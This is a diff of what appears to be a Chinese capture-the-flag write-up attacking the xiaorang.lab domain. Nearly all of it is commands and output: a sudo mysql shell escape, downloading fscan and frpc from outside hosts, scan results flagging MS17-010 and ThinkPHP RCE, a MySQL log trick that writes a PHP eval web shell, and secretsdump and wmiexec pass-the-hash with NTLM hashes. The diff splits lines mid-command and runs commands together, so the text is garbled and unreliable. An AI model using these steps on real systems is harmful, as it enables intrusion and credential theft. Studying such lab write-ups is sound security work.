@@ -19,11 +19,32 @@ sudo -lsudo /usr/bin/mysql -e '! cat /root/flag/flag01.txt'
 
 内网横向
 
-curl http://39.98.170.21:8001/fscan_amd64 --output fscanchmod +x ./fscan./fscan -h 172.22.2.1/24
+curl http://39.98.170.21:
+8001/fscan_amd64 --output fscanchmod +x ./fscan./fscan -h 172.22.2.1/24
 
-172.22.1.18:3306 open172.22.1.18:445 open172.22.1.21:445 open172.22.1.2:445 open172.22.1.18:139 open172.22.1.21:139 open172.22.1.2:139 open172.22.1.18:135 open172.22.1.21:135 open172.22.1.15:22 open172.22.1.2:135 open172.22.1.18:80 open172.22.1.2:88 open172.22.1.15:80 open[*]172.22.1.2 [->]DC01 [->]172.22.1.2[+] 172.22.1.21 MS17-010 (Windows Server 2008 R2 Enterprise 7601 Service Pack 1)[*] NetInfo:[*]172.22.1.18 [->]XIAORANG-OA01 [->]172.22.1.18[*] NetInfo:[*]172.22.1.21 [->]XIAORANG-WIN7 [->]172.22.1.21[*] WebTitle: http://172.22.1.15 code:200 len:5578 title:Bootstrap Material Admin[*] 172.22.1.2 (Windows Server 2016 Datacenter 14393)[*] NetBios: 172.22.1.18 XIAORANG-OA01.xiaorang.lab Windows Server 2012 R2 Datacenter 9600 [*] NetBios: 172.22.1.2 [+]DC DC01.xiaorang.lab Windows Server 2016 Datacenter 14393 [*] NetBios: 172.22.1.21 XIAORANG-WIN7.xiaorang.lab Windows Server 2008 R2 Enterprise 7601 Service Pack 1 [*] WebTitle: http://172.22.1.18 code:302 len:0 title:None 跳转url: http://172.22.1.18?m=login[*] WebTitle: http://172.22.1.18?m=login code:200 len:4012 title:信呼协同办公系统[+] http://172.22.1.15 poc-yaml-thinkphp5023-method-rce poc1
+172.22.1.18:
+3306 open172.22.1.18:
+445 open172.22.1.21:
+445 open172.22.1.2:
+445 open172.22.1.18:
+139 open172.22.1.21:
+139 open172.22.1.2:
+139 open172.22.1.18:
+135 open172.22.1.21:
+135 open172.22.1.15:22 open172.22.1.2:
+135 open172.22.1.18:80 open172.22.1.2:88 open172.22.1.15:80 open[*]172.22.1.2 [->]DC01 [->]172.22.1.2[+] 172.22.1.21 MS17-010 (Windows Server 2008 R2 Enterprise 7601 Service Pack 1)[*] NetInfo:[*]172.22.1.18 [->]XIAORANG-OA01 [->]172.22.1.18[*] NetInfo:[*]172.22.1.21 [->]XIAORANG-WIN7 [->]172.22.1.21[*] WebTitle: http://172.22.1.15 code:
+200 len:
+5578 title:
+Bootstrap Material Admin[*] 172.22.1.2 (Windows Server 2016 Datacenter 14393)[*] NetBios: 172.22.1.18 XIAORANG-OA01.xiaorang.lab Windows Server 2012 R2 Datacenter 9600 [*] NetBios: 172.22.1.2 [+]DC DC01.xiaorang.lab Windows Server 2016 Datacenter 14393 [*] NetBios: 172.22.1.21 XIAORANG-WIN7.xiaorang.lab Windows Server 2008 R2 Enterprise 7601 Service Pack 1 [*] WebTitle: http://172.22.1.18 code:
+302 len:0 title:
+None 跳转url: http://172.22.1.18?m=login[*] WebTitle: http://172.22.1.18?m=login code:
+200 len:
+4012 title:
+信呼协同办公系统[+] http://172.22.1.15 poc-yaml-thinkphp5023-method-rce poc1
 
-curl http://vpsip:8001/frpc --output frpccurl http://vpsip:8001/frpc.ini --output frpc.ininohup ./frpc -c frpc.ini
+curl http://vpsip:
+8001/frpc --output frpccurl http://vpsip:
+8001/frpc.ini --output frpc.ininohup ./frpc -c frpc.ini
 
 show variables like 'general%';查看是否开启日志以及存放的日志位置
 
@@ -31,9 +52,11 @@ set global general_log = ON;开启日志set global general_log_file = "c:/phpStu
 
 XIAORANG-WIN7$/d4df8a3fa73a9fee14a62123784290c6
 
-python3 secretsdump.py XIAORANG-WIN7$@172.22.1.2 -just-dc-user administrator -hashes :d4df8a3fa73a9fee14a62123784290c6
+python3 secretsdump.py XIAORANG-WIN7$@172.22.1.2 -just-dc-user administrator -hashes :
+d4df8a3fa73a9fee14a62123784290c6
 
-python3 wmiexec.py xiaorang/administrator@172.22.1.2 -hashes :10cf89a850fb1cdbe6bb432b859164c8
+python3 wmiexec.py xiaorang/administrator@172.22.1.2 -hashes :
+10cf89a850fb1cdbe6bb432b859164c8
 
 关于我们
 
@@ -44,60 +67,38 @@ python3 wmiexec.py xiaorang/administrator@172.22.1.2 -hashes :10cf89a850fb1cdbe6
 
 ```
 ./fscan_darwin -h 39.98.209.209
-```
-
-
-
-```
 sudo -lsudo /usr/bin/mysql -e '! cat /root/flag/flag01.txt'
-```
-
-
-
-```
-curl http://39.98.170.21:8001/fscan_amd64 --output fscanchmod +x ./fscan./fscan -h 172.22.2.1/24
-```
-
-
-
-```
-172.22.1.18:3306 open172.22.1.18:445 open172.22.1.21:445 open172.22.1.2:445 open172.22.1.18:139 open172.22.1.21:139 open172.22.1.2:139 open172.22.1.18:135 open172.22.1.21:135 open172.22.1.15:22 open172.22.1.2:135 open172.22.1.18:80 open172.22.1.2:88 open172.22.1.15:80 open[*]172.22.1.2 [->]DC01 [->]172.22.1.2[+] 172.22.1.21 MS17-010 (Windows Server 2008 R2 Enterprise 7601 Service Pack 1)[*] NetInfo:[*]172.22.1.18 [->]XIAORANG-OA01 [->]172.22.1.18[*] NetInfo:[*]172.22.1.21 [->]XIAORANG-WIN7 [->]172.22.1.21[*] WebTitle: http://172.22.1.15 code:200 len:5578 title:Bootstrap Material Admin[*] 172.22.1.2 (Windows Server 2016 Datacenter 14393)[*] NetBios: 172.22.1.18 XIAORANG-OA01.xiaorang.lab Windows Server 2012 R2 Datacenter 9600 [*] NetBios: 172.22.1.2 [+]DC DC01.xiaorang.lab Windows Server 2016 Datacenter 14393 [*] NetBios: 172.22.1.21 XIAORANG-WIN7.xiaorang.lab Windows Server 2008 R2 Enterprise 7601 Service Pack 1 [*] WebTitle: http://172.22.1.18 code:302 len:0 title:None 跳转url: http://172.22.1.18?m=login[*] WebTitle: http://172.22.1.18?m=login code:200 len:4012 title:信呼协同办公系统[+] http://172.22.1.15 poc-yaml-thinkphp5023-method-rce poc1
-```
-
-
-
-```
-curl http://vpsip:8001/frpc --output frpccurl http://vpsip:8001/frpc.ini --output frpc.ininohup ./frpc -c frpc.ini
-```
-
-
-
-```
+curl http://39.98.170.21:
+8001/fscan_amd64 --output fscanchmod +x ./fscan./fscan -h 172.22.2.1/24
+172.22.1.18:
+3306 open172.22.1.18:
+445 open172.22.1.21:
+445 open172.22.1.2:
+445 open172.22.1.18:
+139 open172.22.1.21:
+139 open172.22.1.2:
+139 open172.22.1.18:
+135 open172.22.1.21:
+135 open172.22.1.15:22 open172.22.1.2:
+135 open172.22.1.18:80 open172.22.1.2:88 open172.22.1.15:80 open[*]172.22.1.2 [->]DC01 [->]172.22.1.2[+] 172.22.1.21 MS17-010 (Windows Server 2008 R2 Enterprise 7601 Service Pack 1)[*] NetInfo:[*]172.22.1.18 [->]XIAORANG-OA01 [->]172.22.1.18[*] NetInfo:[*]172.22.1.21 [->]XIAORANG-WIN7 [->]172.22.1.21[*] WebTitle: http://172.22.1.15 code:
+200 len:
+5578 title:
+Bootstrap Material Admin[*] 172.22.1.2 (Windows Server 2016 Datacenter 14393)[*] NetBios: 172.22.1.18 XIAORANG-OA01.xiaorang.lab Windows Server 2012 R2 Datacenter 9600 [*] NetBios: 172.22.1.2 [+]DC DC01.xiaorang.lab Windows Server 2016 Datacenter 14393 [*] NetBios: 172.22.1.21 XIAORANG-WIN7.xiaorang.lab Windows Server 2008 R2 Enterprise 7601 Service Pack 1 [*] WebTitle: http://172.22.1.18 code:
+302 len:0 title:
+None 跳转url: http://172.22.1.18?m=login[*] WebTitle: http://172.22.1.18?m=login code:
+200 len:
+4012 title:
+信呼协同办公系统[+] http://172.22.1.15 poc-yaml-thinkphp5023-method-rce poc1
+curl http://vpsip:
+8001/frpc --output frpccurl http://vpsip:
+8001/frpc.ini --output frpc.ininohup ./frpc -c frpc.ini
 show variables like 'general%';查看是否开启日志以及存放的日志位置
-```
-
-
-
-```
 set global general_log = ON;开启日志set global general_log_file = "c:/phpStudy/PHPTutorial/www/1.php"select '<?php eval($_POST[shell]);?>'
-```
-
-
-
-```
 XIAORANG-WIN7$/d4df8a3fa73a9fee14a62123784290c6
-```
-
-
-
-```
-python3 secretsdump.py XIAORANG-WIN7$@172.22.1.2 -just-dc-user administrator -hashes :d4df8a3fa73a9fee14a62123784290c6
-```
-
-
-
-```
-python3 wmiexec.py xiaorang/administrator@172.22.1.2 -hashes :10cf89a850fb1cdbe6bb432b859164c8
+python3 secretsdump.py XIAORANG-WIN7$@172.22.1.2 -just-dc-user administrator -hashes :
+d4df8a3fa73a9fee14a62123784290c6
+python3 wmiexec.py xiaorang/administrator@172.22.1.2 -hashes :
+10cf89a850fb1cdbe6bb432b859164c8
 ```
 
 
